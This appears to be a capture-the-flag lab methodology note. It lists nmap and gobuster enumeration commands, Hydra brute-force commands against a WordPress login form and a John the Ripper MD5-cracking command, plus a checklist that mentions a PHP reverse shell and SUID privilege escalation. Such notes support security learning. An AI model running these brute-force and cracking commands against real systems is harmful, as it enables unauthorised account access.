# Methodology

## Preparation
```bash
export IP="10.10.165.80"
```

## Port enumeration
```bash
mkdir -p scans/nmap
nmap -v -sC -sV -oN nmap/initial $IP
nmap -v -p- -oN nmap/all_ports $IP
```

## HTTP enumeration
```bash
mkdir -p scans/gobuster
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/medium_list -x php,sh,cgi,txt,html,js,css,py
```

## Brute force
```bash
# L = Username wordlist
# l = Username
# P = Password list
# p = password

# Command guide
# sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"

# Brute forcing username
sudo hydra -L downloads/fsocity.dic -p "sample" $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"

# Brute force password
sudo hydra -l Elliot -P downloads/fsocity.dic $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"
```

## Reverse Shell
```bash

```

## Password bruteforce
```bash
# Crack MD5 password found using john

# Command guide
# john <filename> --wordlist=<wordlist> --format=<hash format>

# Determine the file hash type using hash-identifier

john md5.hash --wordlist=downloads/fsocity.dic --format=Raw-MD5

```

# Comments
-   enumerate ports using nmap
    -   found ports 80 and 443
-   enumerate website pages using gobuster
    -   found /login
-   check for available files in robots.txt
    -   found dic and txt
-   use hydra to brute force login
    -   https://infinitelogins.com/2020/02/22/-how-to-brute-force-websites-using-hydra/
-   create php revershell
    -   ready
-   check home directories
-   crack password found using john
-   change shell to interactive using python
-   change to another user using password found
-   find SUID binaries
-   privilege escalation using SUID enabled binaries